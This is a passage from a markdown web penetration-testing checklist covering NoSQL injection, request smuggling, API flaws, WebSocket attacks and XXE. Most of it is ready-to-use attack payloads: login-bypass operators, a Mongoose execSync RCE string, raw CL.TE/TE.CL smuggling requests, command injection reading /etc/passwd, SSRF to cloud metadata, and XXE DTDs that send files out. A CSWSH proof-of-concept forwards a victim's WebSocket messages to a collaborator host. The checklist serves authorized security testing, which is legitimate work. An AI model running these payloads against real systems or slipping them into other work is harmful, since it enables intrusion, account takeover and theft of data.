* [ ] `$nin`: `username[$nin][]=admin&username[$nin][]=test&pass[$ne]=7`
* [ ] `$or`: `', $or: [ {}, { 'a':'a ' } ], $comment:'injected'`

***

### 4. Authentication Bypass

**URL form:**

* [ ] `username[$ne]=toto&password[$ne]=toto`
* [ ] `username[$regex]=.*&password[$regex]=.*`
* [ ] `username[$exists]=true&password[$exists]=true`
* [ ] `login[$gt]=admin&login[$lt]=test&pass[$ne]=1`

**JSON body:**

* [ ] `{"username":{"$ne":null},"password":{"$ne":null}}`
* [ ] `{"username":{"$ne":"foo"},"password":{"$ne":"bar"}}`
* [ ] `{"username":{"$gt":undefined},"password":{"$gt":undefined}}`
* [ ] `{"username":{"$gt":""},"password":{"$gt":""}}`
* [ ] Target a known user: `{"username":{"$eq":"admin"},"password":{"$ne":""}}`

***

### 5. Blind Data Extraction (password/field brute via $regex)

* [ ] Find length: `username[$ne]=toto&password[$regex]=.{1}` → bump `.{N}` until True
* [ ] Anchor first char: `password[$regex]=a.{N-1}` , `b.{N-1}` … iterate
* [ ] Prefix walk: `password[$regex]=^m` → `^md` → `^mdp` (JSON `{"password":{"$regex":"^m"}}`)
* [ ] `$where` char-match: `admin' && this.password.match(/^a.*$/)//`
* [ ] Confirm field exists first: `admin' && this.password //`
* [ ] Script the alphabet loop (`^`+flag+char) against a TRUE/FALSE oracle

***

### 6. JavaScript Execution / RCE

* [ ] `$where` JS: `{"$where":"sleep(2000)||true"}` (timing oracle)
* [ ] `$where` always-true: `$where: '1 == 1'` (and quoted variants)
* [ ] `$func` operator (MongoLite default) → arbitrary function execution
* [ ] **Mongoose `populate({match})` RCE** (≤8.8.2): `?author[$where]=global.process.mainModule.require('child_process').execSync('id')`
* [ ] Bypass top-level `$where` filter by nesting under `$or` (CVE-2025-23061)
* [ ] Meteor `listEmojiCustom` selector → `{"$where":"sleep(2000)||true"}` (≤6.0.0)
* [ ] mapReduce / insert injection: `db.injection.insert({success:1});return 1;...`

***

### 7. Timing-Based Blind

* [ ] `';sleep(5000);`
* [ ] `';it=new Date();do{pt=new Date();}while(pt-it<5000);`
* [ ] `$where` conditional sleep: `function(x){if(x.password[0]==='a'){sleep(5000)}}(this)`
* [ ] Confirm consistent delay (baseline + repeat to rule out jitter)

***

### 8. PHP / Parameter-Pollution Specifics

* [ ] PHP array trick: change `param=foo` → `param[$ne]=foo`
* [ ] `$where` as a PHP variable-name injection (HTTP parameter pollution)
* [ ] Duplicate-key precedence (Mongo keeps **last** key) — send `id=1&id=100` style to override

***

### 9. GraphQL NoSQL Injection

* [ ] Inject operators through filter arguments (objects spread into the query)
* [ ] `{ users(filter: {username: {ne: null}}) { ... } }`
* [ ] Test where untrusted filter objects reach `find()` unsanitized

***

### 10. Tooling

* [ ] **NoSQLMap** — automated enumeration + exploitation
* [ ] **an0nlk/Nosql-MongoDB-injection** — username/password enumeration script
* [ ] Custom Python `$regex`/`$where` extractor against TRUE/FALSE oracle
* [ ] Burp Intruder with operator-injection wordlist (`$ne`/`$gt`/`$regex` permutations)

***

### 11. Confirm Impact

* [ ] Authentication bypass (login as user/admin)
* [ ] Blind data exfiltration (passwords, tokens, PII via `$regex`/`$where`)
* [ ] Data tampering / unauthorized read of full collections
* [ ] JavaScript execution → RCE (Mongoose/Meteor/MongoLite patterns)
* [ ] DoS via heavy `$where` JS
* [ ] Re-verify on a clean request; document the param, injection family (syntax/operator), and backend

</details>

<details>

<summary>Request Smuggling</summary>

> Run these boxes against a target that sits behind a front-end/proxy/CDN (i.e. almost everything). Core idea: the front-end and back-end **disagree on where a request ends** (Content-Length vs Transfer-Encoding, malformed headers, protocol downgrade), letting you prepend bytes to the **next** user's request. Order: prerequisites → detect (timing) → confirm (differential) → identify variant → exploit → browser/connection variants → impact.
>
> **Safety:** confirming on a live site can corrupt real users' requests. Target POST endpoints, preserve expected params, keep attack/victim requests similar, and prefer your own second request to prove it before weaponizing.

***

### 0. Prerequisites & Recon

* [ ] Is there a front-end + back-end hop (CDN, LB, reverse proxy)? (no hop = no classic smuggling)
* [ ] Does the target speak HTTP/1.1 on the back hop? (classic CL/TE lives here)
* [ ] Does it support HTTP/2? → test **H2 downgrade** and **H2.CL / H2.TE** instead
* [ ] Pick a POST endpoint that accepts a body and won't error/close the socket
* [ ] Use Burp Repeater with **"keep-alive"** + disable "update Content-Length" for manual tests
* [ ] Note: connection errors close the socket and break the attack — keep requests clean

***

### 1. Detect via Timing (first pass)

*   [ ] **CL.TE timing probe** — front-end uses CL, back-end uses TE; back-end waits for more data:

    ```
    POST / HTTP/1.1
    Host: target
    Transfer-Encoding: chunked
    Content-Length: 4

    1
    A
    X
    ```

    (back-end hangs waiting → delay = vulnerable)
*   [ ] **TE.CL timing probe** — front-end uses TE, back-end uses CL:

    ```
    POST / HTTP/1.1
    Host: target
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X
    ```
* [ ] Run Burp **HTTP Request Smuggler → "Smuggle probe"** for automated timing detection
* [ ] Don't trust timeout-from-bigger-CL alone (some servers respond without full body)

***

### 2. Confirm via Differential Response (second pass)

* [ ] Send an **ambiguous attack request** then a **normal victim request** on the same connection
* [ ] Look for the victim request getting an **unexpected response** (e.g. "Unknown method GPOST")
* [ ] Keep attack & victim requests as **similar as possible** (same method/path/headers → same back-end routing)
* [ ] Re-send several times — interference/other traffic can cause false negatives
* [ ] Distinguish **pipelining from real smuggling** (reuse false-positives) before claiming the bug

***

### 3. CL.TE (front-end CL, back-end TE)

*   [ ] Basic CL.TE smuggle:

    ```
    POST / HTTP/1.1
    Host: target
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    ```
* [ ] Smuggle a prefix that corrupts the next request
* [ ] Smuggle a full second request (method/path/headers)

***

### 4. TE.CL (front-end TE, back-end CL)

*   [ ] Basic TE.CL smuggle (mind the chunk-size math):

    ```
    POST / HTTP/1.1
    Host: target
    Content-Length: 3
    Transfer-Encoding: chunked

    8
    SMUGGLED
    0

    ```
* [ ] Use a calculator (HTTP-Smuggling-Calculator) to get chunk size + CL right
* [ ] Terminate chunked body correctly (`0\r\n\r\n`)

***

### 5. TE.TE (both support TE — obfuscate one)

> Both ends accept Transfer-Encoding; obfuscate the header so only one honors it.

* [ ] `Transfer-Encoding: xchunked`
* [ ] `Transfer-Encoding : chunked` (space before colon)
* [ ] `Transfer-Encoding:\tchunked` (tab)
* [ ] `Transfer-Encoding\t: chunked`
* [ ] `Transfer-Encoding: chunked` + second `Transfer-Encoding: x` (duplicate)
* [ ] `X: X\nTransfer-Encoding: chunked` (newline-folded)
* [ ] `Transfer-Encoding\n : chunked`
* [ ] Vertical-tab / form-feed / leading-space variants

***

### 6. CL.0 (back-end ignores Content-Length)

* [ ] Send a request where back-end treats CL as 0 → body becomes start of "next" request
* [ ] Confirm with 2 requests, smuggling one in the middle; check if it affects the 2nd response
* [ ] Good against endpoints that ignore CL (static handlers, some redirects)

***

### 7. HTTP/2-Specific

* [ ] **H2.CL** — inject a Content-Length in the H2 request; FE downgrades to H1, back-end desyncs
* [ ] **H2.TE** — inject Transfer-Encoding into the H2 request
* [ ] **H2 downgrade** — proxy converts H2→H1 without sanitizing CL/TE → smuggling
* [ ] Inject CRLF into H2 header **names/values** (`foo: bar\r\nHost: evil`) — H2 lacks the text framing that blocks this
* [ ] Response-queue poisoning via H2.TE
* [ ] Test with smuggleFuzz / Burp H2 features

***

### 8. Connection-State / First-Request Routing

*   [ ] **First-request validation only**: send an allowed `Host`, then re-use the connection with an internal `Host`:

    ```
    GET / HTTP/1.1
    Host: allowed-external-host

    GET /admin HTTP/1.1
    Host: internal-host
    ```
* [ ] Check if 2nd response comes from the **second** Host (vulnerable) vs first (safe)
* [ ] Burp HTTP Request Smuggler → **Connection-state probe**
* [ ] Origin coalescing (H2/H3 same cert+IP) → browser reuses connection to internal host

***

### 9. Exploitation Techniques

* [ ] **Bypass front-end security controls** — smuggle a request to a path the FE blocks (admin, internal, Spring actuator `/trace`, `/httptrace`, `/env`)
* [ ] **Steal other users' requests** — capture victim's request (cookies/auth headers) into a store you can read
* [ ] **Session/credential theft → ATO** via captured headers
* [ ] **Reflected XSS via smuggled headers** (User-Agent SQLi/XSS that browsers can't normally send)
* [ ] **Web cache poisoning** — poison cached response for all users
* [ ] **Response queue poisoning** — desync the response queue so users get each other's responses
* [ ] **Malicious prefix injection** — prepend `GET /redirplz` style redirect to victim requests
* [ ] **Turn on hidden headers** — inject headers the FE strips (X-Forwarded-\*, trust headers)

***

### 10. Browser-Powered (Client-Side) Desync

> Abuses the victim's browser to enqueue a mis-framed request — only browser-legal syntax (no header obfuscation).

* [ ] Confirm **CL.0 / client-side desync** reachable via normal browser requests
* [ ] Only use headers/syntax a browser can emit (navigation, fetch, form) — no duplicate-TE/invalid-CL
* [ ] Target endpoints that reflect input or cache responses
* [ ] JS resource poisoning via Host-header redirects
* [ ] HEAD-method response splicing for harmful HTML
* [ ] Works on HTTP/1.1 connection reuse; H2 sites mostly immune (except FE proxies that don't speak H2 — corporate proxies/VPNs)

***

### 11. Tooling

* [ ] **Burp HTTP Request Smuggler** (BApp — probes, CL.TE/TE.CL/TE.TE, connection-state, H2)
* [ ] **defparam/Smuggler** — `cat alive.txt | python3 smuggler.py -m GET` or `-u <url> -m POST`
* [ ] **HTTP-Smuggling-Calculator** (kleiton0x00) — TE.CL/CL.TE chunk + CL math
* [ ] **smuggleFuzz** — H2/H3 desync brute-forcer
* [ ] **HTTPCustomHouse** (ariary) — CLI raw-request crafting/sending
* [ ] Raw socket / openssl s\_client for hand-crafted malformed requests (mind literal `\r\n`)

***

### 12. Confirm Impact

* [ ] Front-end access-control bypass (reach blocked/internal paths)
* [ ] Capture another user's request (cookies/tokens) → ATO
* [ ] Web cache poisoning (cross-user)
* [ ] Response-queue poisoning (users get wrong responses)
* [ ] Reflected XSS / SQLi via normally-unsendable headers
* [ ] Internal host access via connection-state abuse
* [ ] Re-verify carefully (avoid harming real users); document FE/BE pair, variant (CL.TE / TE.CL / TE.TE / CL.0 / H2.x), and the exact desyncing header

</details>

<details>

<summary>API Vulnerabilities</summary>

> Run these boxes against any REST/JSON/GraphQL/RPC API. Order: discover endpoints → read the contract → fuzz inputs/types → mass assignment → parameter pollution (client + server-side) → JSON injection/parser quirks → method/version/content-type → auth/authz → impact. Capture a baseline request in Burp/Postman first.

***

### 0. Discover the API Surface

* [ ] Find docs: Swagger/OpenAPI (`/swagger`, `/openapi.json`, `/api-docs`), WADL, Postman collections
* [ ] Pull endpoints from JS bundles, source maps, mobile app, network tab
* [ ] Brute-force paths/params (kiterunner, ffuf with API wordlists)
* [ ] Enumerate API **versions** (`/v1/`, `/v2/`, `/internal/`, `/beta/`) — older versions are weaker
* [ ] Map HTTP methods per endpoint (GET/POST/PUT/PATCH/DELETE)
* [ ] Identify the framework/stack (affects parsing quirks below)

***

### 1. Read the Contract, Then Break It

* [ ] Use documented endpoints to learn expected params & types
* [ ] Look for **undocumented** params hinted in docs/JS (`debug`, `admin`, `role`, `isAdmin`)
* [ ] Diff hidden params with Param-Miner / Arjun
* [ ] Note which params are reflected, which change state, which gate access

***

### 2. Input & Type Fuzzing (your JSON test-case bank)

* [ ] Empty values: `{"login":"","password":""}`
* [ ] Null: `{"login":null,"password":null}`
* [ ] Type confusion — number vs string: `{"login":123,"password":456}`
* [ ] Boolean: `{"login":true,"password":false}`
* [ ] Array instead of string: `{"login":["admin"],"password":["password"]}`
* [ ] Object instead of string: `{"login":{"username":"admin"}}`
* [ ] `undefined` / nonexistent value: `{"login":undefined}`
* [ ] Mongo operator object: `{"login":{"$oid":"..."}}` / `{"login":{"$ne":null}}`
* [ ] Overlong values (10k chars) → buffer/DoS/truncation
* [ ] Unicode/escape: `\u0061\u0064...`, control chars `\u0000`, null byte `\0`
* [ ] Numeric edge: exponential `1e100`, huge int `12345678901234567890`, negative, leading zeros, hex `0xabc`, octal `\141`
* [ ] Zero-width chars (U+200B/U+200D), emoji, multilingual
* [ ] Base64 values, env-var refs `${USER}`, URL/email/IP/date formats
* [ ] Injection seeds in values: SQLi `admin' --`, XSS `<svg onload>`, JSON `{"injection":"value"}`
* [ ] Confirm how the API reacts (error, 200, type coercion, reflection)

***

### 3. Structural / Malformed JSON

* [ ] Missing key (`{"password":"admin"}`), swapped keys, extra keys
* [ ] Repeated/duplicate keys: `{"login":"admin","login":"user"}` (which wins?)
* [ ] Empty key `{"":"admin"}`, numeric key `{123:"admin"}`, extremely long key
* [ ] Nested objects / nested arrays (deep) → parser DoS or logic bypass
* [ ] Single quotes instead of double, missing colon, trailing comma, extra symbols after JSON
* [ ] JSON comments `{/*...*/}`
* [ ] Case sensitivity: `{"LOGIN":"admin"}`
* [ ] Content-type swap: JSON → `x-www-form-urlencoded` / `text/plain` (`login=test&password=test`)

***

### 4. Mass Assignment / Object Injection

* [ ] Add privileged fields the UI doesn't send: `"role":"admin"`, `"isAdmin":true`, `"verified":true`, `"balance":1000`, `"id":<other>`
* [ ] Send fields from the GET response back in a PUT/PATCH (auto-bind frameworks)
* [ ] Override server-set fields (`user_id`, `owner`, `status`, `price`)
* [ ] Nested mass assignment: `"user":{"role":"admin"}`

***

### 5. HTTP Parameter Pollution (HPP)

> Parser behavior is stack-specific — duplicating a param can override, concatenate, or pick first/last.

**Server-side HPP:**

* [ ] Duplicate a param: `?id=victim&id=attacker` (which is honored?)
* [ ] Mixed locations: query vs body vs path with the same name
* [ ] Use `&` and `;` delimiters: `?a=1;b=2`
* [ ] Array syntax: `name[]=1&name[]=2` vs `name=1&name=2`
* [ ] Abuse on sensitive actions: transfer (`from`/`to`), password reset (`user`), 2FA, API-key requests
* [ ] Per-stack expectations:
  * [ ] PHP/Apache → **last** param ; ASP/IIS → **all (comma-concat)** ; first-wins on others
  * [ ] Spring `RequestMapping` vs `PostMapping` differences with `name` vs `name[]`
  * [ ] Node/Express, Flask, Go each differ — test, don't assume

**Client-side HPP:**

* [ ] Inject URL-encoded `&` into a reflected param (`val%26HPP_TEST`) → look for `&HPP_TEST` in generated links/forms

**Server-Side Parameter Pollution (SSPP):**

* [ ] App embeds your input into an internal API request → inject `&`/`#`/extra params:
  * [ ] Add param: `field=x%26admin=true`
  * [ ] Truncate internal query: `field=x%23`
  * [ ] Override internal param by duplicating it

***

### 6. JSON Injection / Parser Discrepancies

* [ ] Inject JSON structure into a string value: `{"login":"{\"injection\":\"value\"}"}`
* [ ] Key-collision between two parsers (front-end validates one key, back-end reads another)
* [ ] Duplicate keys parsed differently by validator vs consumer → bypass validation
* [ ] Unicode-escape a key/value to dodge a denylist but hit the same backend field
* [ ] Type juggling at the JSON layer (`"isAdmin":"true"` vs `true`)
* [ ] (If Node + recursive merge) `__proto__` keys → prototype pollution (separate checklist)

***

### 7. Method, Version & Header Manipulation

* [ ] Method override: `X-HTTP-Method-Override: PUT`, `_method=DELETE`
* [ ] Try unlisted methods (PUT/PATCH/DELETE) on read endpoints
* [ ] Swap `Content-Type` to change parsing (JSON ↔ form ↔ XML → **XXE** if XML accepted)
* [ ] Downgrade to an older API version and replay the attack
* [ ] Tamper headers the API trusts (`X-Forwarded-For`, `X-Original-URL`, custom auth headers)
* [ ] Wildcards / mass-fetch params (`fields=*`, `expand=all`)

***

### 8. Auth / Authz (API-specific)

* [ ] Call the endpoint with no token / expired token / another user's token
* [ ] BOLA: change object IDs in path/body (advanced: predictable/encoded IDs, GraphQL node IDs)
* [ ] BFLA: hit admin/privileged functions as a low-priv user
* [ ] Token audience/scope reuse across endpoints
* [ ] Rate-limit / brute-force protections on auth endpoints (batch via GraphQL)

***

### 9. GraphQL / RPC Specifics

* [ ] Introspection enabled (`__schema`) → map the whole API
* [ ] Batching / aliasing to bypass rate limits or brute-force
* [ ] Field-level authz (can a low-priv user select privileged fields?)
* [ ] Query depth/complexity DoS
* [ ] tRPC/Zod stacks — trigger sensitive procedures (e.g. migration retry → race/DoS)
* [ ] Inject operators through filter args (NoSQL/SQL via GraphQL)

***

### 10. Confirm Impact

* [ ] Auth bypass / privilege escalation (mass assignment, HPP, type confusion)
* [ ] BOLA/BFLA → access other users' data or admin functions
* [ ] SSPP → manipulate internal requests (reset others' creds, change transactions)
* [ ] Injection chained from JSON value (SQLi/NoSQLi/XSS/XXE)
* [ ] DoS (overlong/deep JSON, heavy GraphQL, worker starvation)
* [ ] Data leak via verbose errors / over-broad field selection
* [ ] Re-verify on a clean session; document endpoint, method, param, and the parser/stack behavior that allowed it

</details>

<details>

<summary>WebSocket Attacks </summary>

> Run these boxes against any app using WebSockets (live chat, notifications, trading, gaming, collab). A WS connection starts as an HTTP `Upgrade` handshake then goes full-duplex. Two attack surfaces: the **handshake** (CSWSH, smuggling, IP/header tricks) and the **messages** (every server-side injection, IDOR, logic). Order: recon/intercept → decode → handshake attacks → message injection → CSWSH → smuggling → DoS → race → tooling → impact.

***

### 0. Recon & Intercept

* [ ] Capture the WS handshake + traffic in Burp (WebSockets history tab) or DevTools
* [ ] Note the WS URL (`ws://` vs `wss://`) and any subprotocol
* [ ] Read handshake headers:
  * [ ] `Sec-WebSocket-Extensions: permessage-deflate` → messages DEFLATE-compressed (use `zlib`)
  * [ ] `Sec-WebSocket-Protocol` → subprotocol (`json`/`protobuf`/`msgpack`/`graphql-ws`/`mqtt`)
  * [ ] `Origin` — is it validated server-side? (key for CSWSH)
* [ ] Map message types/actions the client can send (`profile`, `order_details`, `ASSIGN ROLE`, etc.)
* [ ] Send a WS message to Burp Repeater (Ctrl+R) for tampering

***

### 1. Decode / Find Crypto & Encoding

* [ ] `wss://` is TLS at transport only — messages still readable in Burp/DevTools (not E2E)
*   [ ] DevTools (Sources → Ctrl+Shift+F) grep for crypto/encoding keywords:

    ```
    crypto.subtle, importKey, deriveKey, encrypt, decrypt, pbkdf2, hkdf, AES, RSA, argon2, protobuf, msgpack, base64, atob, Uint8Array, new WebSocket, ws.send
    ```
* [ ] If `permessage-deflate`: decompress with Python `zlib` to read/tamper
* [ ] Client-side encryption? Use **PyCript-WebSocket** Burp ext to encrypt/decrypt inline

***

### 2. Handshake Manipulation

* [ ] Tamper handshake headers and replay (PortSwigger handshake lab)
* [ ] **IP-ban / rate-limit bypass:** add `X-Forwarded-For: 1.1.1.1` to the handshake
* [ ] Test attacker-controlled headers the app trusts in the handshake
* [ ] Remove/alter auth token in handshake — still connects?
* [ ] Try downgrading `Sec-WebSocket-Version` (also feeds smuggling test below)

***

### 3. Message Injection (treat every message as untrusted input)

* [ ] **SQLi:** `{"username":"admin' OR '1'='1' -- ","password":"x"}`
* [ ] **NoSQLi:** `{"username":{"$ne":null},...}`
* [ ] **Command injection:** `{"command":"ping 127.0.0.1 && cat /etc/passwd"}`
* [ ] **XSS (stored/reflected via chat):** `{"message":"<img src=0 onerror=alert(1)>"}`
* [ ] **XXE** (if XML over WS): `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...&xxe;...`
* [ ] **SSRF:** `{"url":"http://169.254.169.254/latest/meta-data/","action":"fetch_url"}`
* [ ] **IDOR:** swap object IDs — `{"request":"order_details","order_id":"1002"}`
* [ ] **Path traversal / LFI** in file/path fields
* [ ] **Logic abuse / state mutation:** invalid enum values (e.g. `"role":"crash"` → broadcast crash), forced state changes
* [ ] **Privileged actions:** `KICK`/`ASSIGN ROLE`/admin commands as a low-priv user (BFLA over WS)
* [ ] Fuzz with sqlmap via a WS→HTTP bridge (`sqlmap -u ... --tamper=...`)

***

### 4. CSWSH (Cross-Site WebSocket Hijacking)

> CSRF on the handshake: if it authenticates by cookie alone (no CSRF token) and `Origin` isn't validated, an attacker page can open an authed WS as the victim.

* [ ] **Origin check:** replay handshake with a spoofed `Origin` in Repeater — does it still connect (no 403)?
* [ ] **Cookie conditions:** is the session cookie `SameSite=None` (and `Secure`)? (Lax/Strict blocks it)
* [ ] Delete cookies from handshake — is auth even required to connect?
*   [ ] Build PoC page that opens the WS and exfils responses:

    ```html
    <script>
    var ws = new WebSocket('wss://victim.tld/chat');
    ws.onopen = () => ws.send("READY");
    ws.onmessage = e => fetch('https://collab.oastify.com',{method:'POST',mode:'no-cors',body:e.data});
    </script>
    ```
* [ ] Confirm victim data (chat history, profile, tokens) reaches your listener
* [ ] Note browser limits: Firefox Total Cookie Protection / Chrome 3rd-party-cookie block defeat it; Chrome/Chromium with `SameSite=None` are fair game
* [ ] Escalate: leaked chat history/token → ATO

***

### 5. WebSocket / Upgrade-Header Smuggling

> Trick a reverse proxy into thinking a WS upgrade succeeded, then reuse the socket for raw HTTP to the backend (reach hidden endpoints).

* [ ] Send a malformed upgrade (e.g. wrong `Sec-WebSocket-Version`)
* [ ] Backend rejects with non-101 (e.g. `426 Upgrade Required`)
* [ ] Proxy (partial checks) treats it as upgraded, keeps upstream TCP open
* [ ] Reuse the open socket to send standard HTTP requests directly to the backend
* [ ] Probe for proxy-restricted/internal endpoints via the smuggled channel

***

### 6. Denial of Service

* [ ] **Frame-length abuse:** declare huge frame length (near `Integer.MAX_VALUE`) → server pre-allocates → OOM crash
* [ ] **Connection flood:** open hundreds of WS connections, keep-alive with periodic sends
* [ ] **Message flood:** single connection, infinite large-message spam (`'A'.repeat(10000)`)
* [ ] **Compression bomb:** abuse `permessage-deflate` with highly compressible payload (`'A'.repeat(1000000)`)
* [ ] (Test on authorized/non-prod targets only — these are destructive)

***

### 7. Race Conditions over WS

* [ ] Send multiple state-changing messages in parallel
* [ ] Burp **WebSocket Turbo Intruder** — THREADED engine, spawn multiple WS connections, tune `config()` thread count (more reliable than single-connection batching)
* [ ] Target limit-checks / balance / one-time actions (redeem, vote, transfer)
* [ ] WS\_RaceCondition\_PoC (Java) for parallel WS messages
* [ ] Confirm double-spend / limit bypass / inconsistent state

***

### 8. Loopback / Desktop-App IPC (bonus)

* [ ] Desktop launchers expose JSON-RPC WS on `127.0.0.1:<port>` (browser doesn't enforce SOP on loopback)
* [ ] Any web page can attempt the handshake — test if the agent accepts arbitrary `Origin` and skips secondary auth
* [ ] If so → remotely controllable IPC from JS

***

### 9. Tooling

* [ ] Burp WebSockets history + Repeater (intercept/tamper)
* [ ] **WebSocket Turbo Intruder** (race / automation)
* [ ] **PyCript-WebSocket** (encrypt/decrypt client-side-crypto messages)
* [ ] **socketsleuth** (Snyk Burp ext), **wsrepl** (Doyensec REPL), **cswsh** CLI tool
* [ ] websocket.org echo client for quick PoC

***

### 10. Confirm Impact

* [ ] Stored/reflected XSS via chat messages
* [ ] SQLi / NoSQLi / command injection / XXE / SSRF through message fields
* [ ] IDOR → other users' data over WS
* [ ] CSWSH → data exfiltration / ATO
* [ ] BFLA → privileged actions (kick host, assign roles, crash broadcasts)
* [ ] Smuggling → hidden/internal endpoint access
* [ ] DoS (OOM / flood / compression bomb)
* [ ] Race → limit/balance bypass
* [ ] Re-verify on a clean session; document WS URL, message type, and whether handshake-level or message-level

</details>

<details>

<summary>XXE</summary>

> Run these boxes against anything that parses XML — even surfaces that don't _look_ like XML. Core idea: define an external entity in a `DOCTYPE`/DTD and make the parser resolve a `file://`, `http://`, or `php://` resource. Order: find the XML surface → detect → in-band file read → blind OOB → error-based → XInclude → file-upload vectors → JSON→XML pivot → DoS → filter bypass → tooling → impact.

***

### 0. Find the XML Attack Surface

* [ ] Request body is `application/xml` / `text/xml` → test directly
* [ ] **Content-type pivot:** change `application/json` or `x-www-form-urlencoded` → `application/xml` and rebuild the body as XML
* [ ] **File uploads** that parse/extract: DOCX/XLSX/PPTX/ODT (zip → edit inner `.xml`), PDF, SVG
* [ ] **SVG** accepted in image/avatar upload → inject XML
* [ ] **RSS/Atom** feed input
* [ ] **SOAP** endpoints (fuzz `/soap`, `/ws`, `?wsdl`) — legacy but common
* [ ] **SAML/SSO** request/response (inject in the assertion XML)
* [ ] XMP metadata inside JPEG/image uploads
* [ ] Network XML listeners (e.g. JMF on Xerox FreeFlow port 4004)
* [ ] Non-obvious params — try `%26entity;` (URL-encoded `&`) to see if entities are processed

***

### 1. Detect

*   [ ] Declare a harmless internal entity and see if it expands:

    ```xml
    <!DOCTYPE foo [<!ENTITY toreplace "3">]><stockCheck><productId>&toreplace;</productId></stockCheck>
    ```
*   [ ] Parameter-entity OOB probe (when entity expansion isn't reflected):

    ```xml
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;]>
    ```
* [ ] Watch for: reflected value, parser error (`SAXParseException`/`lxml.etree`/`System.Xml`), or OOB hit
* [ ] `file:///dev/random` hang = file-read primitive even with no reflection

***

### 2. In-Band File Retrieval (classic)

* [ ] `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`
* [ ] Inject the entity into the field that's **echoed** in the response
* [ ] Windows: `file:///c:/windows/win.ini`
* [ ] PHP base64 wrapper (binary/source): `php://filter/convert.base64-encode/resource=/etc/passwd`
* [ ] `data://text/plain;base64,...` wrapper
* [ ] Read app source: `WEB-INF/web.xml`, config files

***

### 3. Blind XXE → Out-of-Band Exfiltration (external DTD)

* [ ] Confirm OOB: `<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;]>`
*   [ ] Host a malicious external DTD:

    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?x=%file;'>">
    %eval;
    %exfil;
    ```
* [ ] Trigger it: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd"> %xxe;]>`
* [ ] FTP exfil channel for multi-line/large files (xxe-ftp-server)
* [ ] Watch Collaborator/your server logs for the file content

***

### 4. Error-Based (in-band, no reflection)

*   [ ] Remote external DTD that forces the filename into an error:

    ```xml
    <!ENTITY % file SYSTEM "file:///home/carlos/secret">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
    ```
*   [ ] **Local-DTD reuse** (when egress is firewalled) — redefine a param entity in an on-disk DTD:

    ```xml
    <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;>">%eval;%error;'>
    %local_dtd;
    ]>
    ```
* [ ] Find a local DTD that ships with the target OS (docbookx.dtd / cim20.dtd / svg10.dtd / JDK XMLSchema.dtd) — use dtd-finder
* [ ] Confirm filename appears in error: `<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///abcxyz/"> %local_dtd;]>`

***

### 5. CDATA Wrapping (retrieve XML/special-char files in-band)

*   [ ] Wrap file content in CDATA via external DTD to read XML/HTML files:

    ```xml
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///var/www/html/WEB-INF/web.xml">
    <!ENTITY % end "]]>">
    <!ENTITY wrapper "%start;%file;%end;">
    ```
* [ ] Reference `&wrapper;` in the reflected element

***

### 6. XInclude (no DOCTYPE control)

> Use when your input is placed into a server-side XML doc you don't fully control (e.g. backend SOAP).

* [ ] `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
*   [ ] URL-encode when injecting into a param:

    ```
    <foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>
    ```
* [ ] XInclude pointing at attacker URL (SSRF/remote)

***

### 7. File-Upload Vectors

*   [ ] **SVG** (rendered → entity content appears in rasterized image):

    ```xml
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>
    ```
* [ ] **SVG `expect://`** for command exec (PHP imagick): `<image xlink:href="expect://ls">`
* [ ] **DOCX/XLSX/PPTX** — unzip, inject DOCTYPE+entity into `word/document.xml` / `xl/workbook.xml`, re-zip
* [ ] **PDF** generators / converters (resume parser, e-sign, report gen)
* [ ] **XMP metadata** in JPEG → blind XXE
* [ ] **SAML** assertion / **SOAP** body (CDATA-wrap a nested DOCTYPE)
* [ ] Use oxml\_xxe / docem to embed payloads into office/image files

***

### 8. JSON → XML Content-Type Pivot

*   [ ] JSON-only endpoint may auto-negotiate XML — resend with `Content-Type: application/xml`:

    ```xml
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><id>&xxe;</id></root>
    ```
* [ ] Works on Spring, Jackson, .NET `ApiController` unless explicitly restricted
* [ ] Check the dispatcher's accepted content-type list (the real attack surface)

***

### 9. SSRF / RCE Escalation

* [ ] SSRF: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` (AWS IMDSv1 reachable from inside VM)
* [ ] Internal port/host scan via `http://internal:port` entities
* [ ] PHP `expect://` wrapper → command execution (if expect module loaded)
* [ ] XXE chained from deserialization → file read → RCE (Pornhub-style chain)
* [ ] Note: IMDSv2 usually NOT reachable (XXE can't send the required token header)

***

### 10. DoS (only if authorized)

* [ ] **Billion Laughs** (exponential entity expansion) — nested `lol1`…`lol9`
* [ ] **Quadratic blowup** (one big entity referenced many times)
* [ ] Parameter-entity delayed-interpretation variant (Pipping)
* [ ] `file:///dev/random` / `/dev/zero` resource exhaustion

***

### 11. Filter / WAF Bypass

* [ ] Case manipulation: `<!entity>`, `<!EnTiTy>` (parser-dependent)
* [ ] **Parameter entities** to indirect through an external DTD (dodges `<!ENTITY ... SYSTEM>` inline filters)
